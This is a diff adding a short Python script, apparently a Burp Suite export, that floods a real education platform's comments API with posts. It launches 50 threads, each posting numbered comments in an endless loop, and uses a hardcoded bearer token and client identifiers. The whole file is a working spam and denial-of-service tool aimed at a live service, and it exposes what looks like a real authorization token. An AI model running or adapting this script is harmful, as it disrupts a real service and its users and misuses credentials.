@@ -1,0 +1,23 @@
+import requests
+import threading
+burp0_url = "https://api.penpencil.xyz:443/v1/comments"
+burp0_headers = {"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "Sec-Ch-Ua-Mobile": "?0", "Client-Version": "101", "Authorization": "Bearer aa87af4d0720947f22cdd0bfef5dd9dd4fa7e7cf3cd528ea925b8b903d375428", "X-Header": "Authorization", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36", "Randomid": "38895812-aa95-4925-a26b-c55b9897069f", "Client-Id": "5eb393ee95fab7468a79d189", "Client-Type": "WEB", "Sec-Ch-Ua-Platform": "\"Linux\"", "Origin": "https://pw.live", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://pw.live/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}
+burp0_json={"text": "qwerty", "type": "BATCH_SUBJECT_SCHEDULE", "typeId": "628e67abbdc1060011f79b12"}
+def do():
+    i=0
+    while True:
+        burp0_json={"text": str(i), "type": "BATCH_SUBJECT_SCHEDULE", "typeId": "628e67abbdc1060011f79b12"}
+        a=requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
+        i+=1
+        print(a.status_code)
+threads=[]
+for i in range(50):
+    t=threading.Thread(target=do)
+    t.daemon=True
+    threads.append(t)
+
+for i in range(50):
+    threads[i].start()
+
+for i in range(50):
+    threads[i].join()
